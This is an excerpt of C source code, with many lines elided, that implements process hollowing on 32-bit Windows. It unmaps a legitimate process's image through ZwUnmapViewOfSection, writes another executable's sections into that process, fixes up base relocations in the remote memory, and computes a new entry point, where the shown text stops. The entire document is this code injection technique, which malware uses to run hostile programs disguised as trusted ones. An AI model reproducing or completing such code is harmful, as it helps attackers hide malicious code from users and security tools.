...
int ProcessHollowing(char *DestinationProgramPath, char *SourceProgramPath)
{
    ...
    ZwUnmapViewOfSection = GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");
    ...
    if (ReadProcessMemory(pi.hProcess, Context.Ebx, &peb, sizeof(PEB), NULL) == NULL)
    {
    ...
    if (ZwUnmapViewOfSection(pi.hProcess, peb.ImageBaseAddress) == STATUS_ACCESS_DENIED)
    {
    ...
    IMAGE_NT_HEADERS32 *NT = (ULONG)DOS + DOS->e_lfanew;
    printf("[*] Source NT header : 0x%p\n", NT);

    IMAGE_SECTION_HEADER (*SECTION)[1] = (ULONG)NT + sizeof(IMAGE_NT_HEADERS32);
    ...
    for (int i = 0; i < NT->FileHeader.NumberOfSections; i++)
    {
        ...
        PVOID SrcSectionRowDataPointer = (ULONG)SourceBuffer + SECTION[i]->PointerToRawData;
        PVOID DestSectionVirtualAddress = (ULONG)DestImageBase + SECTION[i]->VirtualAddress;
    ...
    if (DestImageBase != SrcImageBase)
    {
        ...
        for (int i = 0; i < NT->FileHeader.NumberOfSections; i++)
        {
            ...
            {
                BASE_RELOCATION = (ULONG)SourceBuffer + SECTION[i]->PointerToRawData;
                break;
            }
        }
        ...
        {
            BASE_RELOCATION_ENTRY (*Type)[1] = (ULONG)BASE_RELOCATION + 8;

            for (int i = 0; i < (BASE_RELOCATION->SizeOfBlock - 8) / 2; i++)
            {
                if ((*Type[i]).Offset != NULL)
                {
                    PVOID HardCodingAddress = (ULONG)DestImageBase + BASE_RELOCATION->VirtualAddress + (*Type[i]).Offset;
                    ULONG HardCodingData;

                    if (ReadProcessMemory(pi.hProcess, HardCodingAddress, &HardCodingData, 4, NULL) == NULL)
                    {
                    ...
                    HardCodingData -= (ULONG)SrcImageBase;
                    HardCodingData += (ULONG)DestImageBase;

                    printf("0x%p\n", HardCodingData);

                    if (WriteProcessMemory(pi.hProcess, HardCodingAddress, &HardCodingData, 4, NULL) == NULL)
                    {
            ...
            BASE_RELOCATION = (ULONG)BASE_RELOCATION + BASE_RELOCATION->SizeOfBlock;
        }
    }

    ULONG NewEntryPoint = (ULONG)DestImageBase + NT->OptionalHeader.AddressOfEntryPoint;
